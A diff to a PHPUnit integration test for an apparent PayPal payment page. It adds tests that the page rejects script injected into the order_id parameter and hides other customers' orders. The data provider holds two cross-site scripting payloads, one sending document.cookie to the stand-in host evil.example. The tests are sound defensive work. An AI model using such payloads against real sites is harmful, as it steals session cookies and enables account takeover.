@@ -14,6 +14,7 @@ declare(strict_types=1);
 
 namespace PayPal\Tests;
 
+use PHPUnit\Framework\Attributes\DataProvider;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
 use Symfony\Component\HttpKernel\HttpKernelInterface;
@@ -60,14 +61,53 @@ final class CheckoutReturnsTest extends IntegrationTestCase
         self::assertStringNotContainsString('/order-failed', $html);
     }
 
-    private function request(string $uri, Customer $customer): Response
+    /** @return iterable<string, array{string, string}> */
+    public static function scriptInjections(): iterable
+    {
+        yield 'script without a slash' => [';alert(document.cookie)', 'alert(document.cookie)'];
+        yield 'script with a redirection' => [';location=`//evil.example/`+document.cookie//', 'evil.example'];
+    }
+
+    #[DataProvider('scriptInjections')]
+    public function testThePaymentPageNeverWritesAnythingButAnOrderIdInItsScript(string $suffix, string $injected): void
+    {
+        $customer = $this->createFixtureFactory()->customer($this->createFixtureFactory()->customerTitle());
+        $order = $this->createFixtureFactory()->order($customer, ['statusCode' => OrderStatus::CODE_NOT_PAID, 'paymentModuleCode' => 'PayPal']);
+
+        $response = $this->request('/order/paypal/pay?order_id='.rawurlencode($order->getId().$suffix), $customer);
+
+        self::assertStringNotContainsString($injected, (string) $response->getContent());
+        self::assertSame(Response::HTTP_BAD_REQUEST, $response->getStatusCode());
+    }
+
+    public function testThePaymentPageOfAnotherCustomersOrderIsNotFound(): void
+    {
+        $fixtures = $this->createFixtureFactory();
+        $order = $fixtures->order($fixtures->customer($fixtures->customerTitle()), ['statusCode' => OrderStatus::CODE_NOT_PAID, 'paymentModuleCode' => 'PayPal']);
+
+        $response = $this->request('/order/paypal/pay?order_id='.$order->getId(), $fixtures->customer($fixtures->customerTitle()));
+
+        self::assertSame(Response::HTTP_NOT_FOUND, $response->getStatusCode());
+    }
+
+    public function testThePaymentPageIsNotFoundToNobodySignedIn(): void
+    {
+        $fixtures = $this->createFixtureFactory();
+        $order = $fixtures->order($fixtures->customer($fixtures->customerTitle()), ['statusCode' => OrderStatus::CODE_NOT_PAID, 'paymentModuleCode' => 'PayPal']);
+
+        $response = $this->request('/order/paypal/pay?order_id='.$order->getId(), null);
+
+        self::assertSame(Response::HTTP_NOT_FOUND, $response->getStatusCode());
+    }
+
+    private function request(string $uri, ?Customer $customer): Response
     {
         $request = Request::create($uri);
         $session = static::getContainer()->get('request_stack')->getCurrentRequest()?->getSession();
         self::assertInstanceOf(Session::class, $session);
-        $session->setCustomerUser($customer);
+        null === $customer ? $session->clearCustomerUser() : $session->setCustomerUser($customer);
         $request->setSession($session);
 
-        return static::$kernel->handle($request, HttpKernelInterface::SUB_REQUEST, false);
+        return static::$kernel->handle($request, HttpKernelInterface::SUB_REQUEST);
     }
 }
